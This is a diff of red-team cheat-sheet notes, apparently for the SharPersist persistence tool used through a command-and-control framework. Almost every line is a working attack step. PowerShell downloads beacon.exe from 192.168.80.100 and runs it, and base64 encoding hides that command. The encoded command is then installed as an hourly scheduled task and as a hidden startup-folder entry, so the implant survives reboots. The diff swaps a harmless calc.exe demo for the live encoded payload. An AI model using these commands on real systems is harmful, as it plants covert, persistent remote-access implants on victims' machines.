@@ -3,25 +3,25 @@ https://github.com/mandiant/SharPersist
 
 ### Powershell Encoding & Decoding
 ```powershell
-$str = 'Invoke-WebRequest -Uri "http://192.168.80.100/beacon.exe" -OutFile "c:\users\user2\beacon.exe"; Start-Process -Filepath "c:\users\user2\beacon.exe"'
-[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+$code = ' $wc = New-Object System.Net.WebClient; $wc.DownloadFile("http://192.168.80.100/beacon.exe", "C:\users\public\beacon.exe"); Start-Process -FilePath "C:\users\public\beacon.exe"; '
+[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($code))
 ```
 ```powershell
-$Encoded="SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AOAAwAC4AMQAwADAAOgA4ADAALwBiAGUAYQBjAG8AbgAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAGMAOgBcAHUAcwBlAHIAcwBcAHUAcwBlAHIAMgBcAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBwAGEAdABoACAAIgBjADoAXAB1AHMAZQByAHMAXAB1AHMAZQByADIAXABiAGUAYQBjAG8AbgAuAGUAeABlACIA"
+$Encoded="IAAkAHcAYwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA4ADAALgAxADAAMAAvAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgAsACAAIgBDADoAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAiAEMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAYgBlAGEAYwBvAG4ALgBlAHgAZQAiADsAIAA"
 [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Encoded))
 
 ```
 
 ### Task Scheduler
 ```powershell
-execute-assembly /root/SharPersist.exe -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Name" -m add -o hourly
+execute-assembly /root/SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc IAAkAHcAYwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA4ADAALgAxADAAMAAvAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgAsACAAIgBDADoAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAiAEMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAYgBlAGEAYwBvAG4ALgBlAHgAZQAiADsAIAA=" -n "Name" -m add -o hourly
 execute-assembly /root/SharPersist.exe -t schtask -n "Name" -m list
 execute-assembly /root/SharPersist.exe -t schtask -n "Name" -m remove
 ```
 
 ### Startup Folder
 ```powershell
-execute-assembly /root/SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AOAAwAC4AMQAwADAAOgA4ADAALwBiAGUAYQBjAG8AbgAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAGMAOgBcAHUAcwBlAHIAcwBcAHUAcwBlAHIAMgBcAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBwAGEAdABoACAAIgBjADoAXAB1AHMAZQByAHMAXAB1AHMAZQByADIAXABiAGUAYQBjAG8AbgAuAGUAeABlACIA" -f "Name" -m add
+execute-assembly /root/SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc IAAkAHcAYwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA4ADAALgAxADAAMAAvAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgAsACAAIgBDADoAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAiAEMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAYgBlAGEAYwBvAG4ALgBlAHgAZQAiADsAIAA=" -f "Name" -m add
 execute-assembly /root/SharPersist.exe -t startupfolder -m list
 execute-assembly /root/SharPersist.exe -t startupfolder -f "Name" -m remove
 ```
